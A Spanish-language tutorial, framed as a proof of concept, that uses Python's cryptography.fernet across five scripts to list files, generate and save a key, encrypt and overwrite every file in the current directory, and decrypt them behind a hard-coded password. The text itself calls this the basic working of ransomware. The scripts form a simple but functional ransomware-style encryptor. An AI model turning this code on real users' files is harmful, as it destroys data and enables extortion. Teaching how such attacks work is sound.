
---
# PoC_tutorial: `cryptography.fernet`

Este documento es un **tutorial práctico paso a paso** sobre la librería `cryptography.fernet` de Python, mostrando cómo listar archivos, generar una clave, cifrar y descifrar ficheros, e incluso añadir un control de acceso mediante contraseña.

---

## Introducción a `cryptography.fernet`

`cryptography.fernet` permite realizar cifrado simétrico seguro con autenticación de mensajes integrada. Sus principales características:

- Generación de claves seguras (`Fernet.generate_key()`).
    
- Funciones de cifrado y descifrado (`encrypt()` y `decrypt()`) que manejan `bytes`.
    
- Protección de integridad y confidencialidad de los datos.
    

El tutorial muestra la evolución de scripts que usan Fernet desde operaciones básicas hasta un flujo completo de cifrado/descifrado. Podría decirse que esto es cómo funciona básicamente un ransomware

---

# Evolución de Scripts

## Script 1 — `encrypt_v1.py`

**Función:** Listar archivos en el directorio actual, excluyendo el script propio.

```python
#!/usr/bin/env python3
import os
files = []
for file in os.listdir():
    if file == "encrypt_v1.py":
        continue
    if os.path.isfile(file):
        files.append(file)
print(files)
```

**Salida:**

```
['saludo.txt', 'enfado.txt', 'pwned.txt']
```

## Script 2 — `encrypt_v2.py`

**Función:** Generar una clave Fernet.

```python
#!/usr/bin/env python3
import os
from cryptography.fernet import Fernet
files = []
for file in os.listdir():
    if file == "encrypt_v1.py":
        continue
    if os.path.isfile(file):
        files.append(file)
key = Fernet.generate_key()
print(key)
```

**Salida:** Clave Fernet en bytes.

## Script 3 — `encrypt_v3.py`

**Función:** Guardar la clave en un fichero.

```python
#!/usr/bin/env python3
import os
from cryptography.fernet import Fernet
files = []
for file in os.listdir():
    if file == "encrypt_v1.py":
        continue
    if os.path.isfile(file):
        files.append(file)
print(files)
key = Fernet.generate_key()
with open("thekey.key", "wb") as k:
    k.write(key)
```

## Script 4 — `encrypt_v4.py` + `decrypt.py`

**Función:** Cifrar y descifrar archivos usando la clave Fernet.

**Cifrado (`encrypt_v4.py`):**

```python
#!/usr/bin/env python3
import os
from cryptography.fernet import Fernet
files = []
for file in os.listdir():
    if file in ["encrypt_v4.py", "thekey.key", "decrypt.py"]:
        continue
    if os.path.isfile(file):
        files.append(file)
key = Fernet.generate_key()
with open("thekey.key", "wb") as k:
    k.write(key)
for file in files:
    with open(file, "rb") as f:
        contents = f.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as f:
        f.write(contents_encrypted)
```

**Descifrado (`decrypt.py`):**

```python
#!/usr/bin/env python3
import os
from cryptography.fernet import Fernet
files = []
for file in os.listdir():
    if file in ["encrypt_v4.py", "thekey.key", "decrypt.py"]:
        continue
    if os.path.isfile(file):
        files.append(file)
with open("thekey.key", "rb") as k:
    secretkey = k.read()
for file in files:
    with open(file, "rb") as f:
        contents = f.read()
    contents_decrypted = Fernet(secretkey).decrypt(contents)
    with open(file, "wb") as f:
        f.write(contents_decrypted)
```

**Salida:** Archivo cifrado y luego descifrado correctamente.

## Script 5 — `encrypt_v5.py` + `decrypt.py` con contraseña

**Función:** Añadir control de acceso mediante contraseña al descifrado.

```python
#!/usr/bin/env python3
import os
from cryptography.fernet import Fernet
files = []
for file in os.listdir():
    if file in ["encrypt_v5.py", "thekey.key", "decrypt.py"]:
        continue
    if os.path.isfile(file):
        files.append(file)
with open("thekey.key", "rb") as k:
    secretkey = k.read()
secretPass = "pwned"
user_Pass = input("\n[+] Introduce el pase secreto para desencriptar tus archivos: ")
if user_Pass == secretPass:
    for file in files:
        with open(file, "rb") as f:
            contents = f.read()
        contents_decrypted = Fernet(secretkey).decrypt(contents)
        with open(file, "wb") as f:
            f.write(contents_decrypted)
    print("\n[!] Enhorabuena tus archivos fueron descifrados\n")
else:
    print("\n[!!!] Ese no es el pase secreto, lo siento.")
```

**Salida:**

- Contraseña incorrecta → no descifra.
    
- Contraseña correcta (`pwned`) → archivos restaurados.
    

---

**Resumen:**  
Este tutorial muestra:

1. Listar archivos.
    
2. Generar y guardar clave Fernet.
    
3. Cifrar archivos y sobrescribirlos.
    
4. Descifrar archivos correctamente.
    
5. Añadir control de acceso por contraseña antes del descifrado.
    

El flujo se puede extender con mejoras de seguridad, exclusión de archivos por patrones, manejo de errores y logging.

---

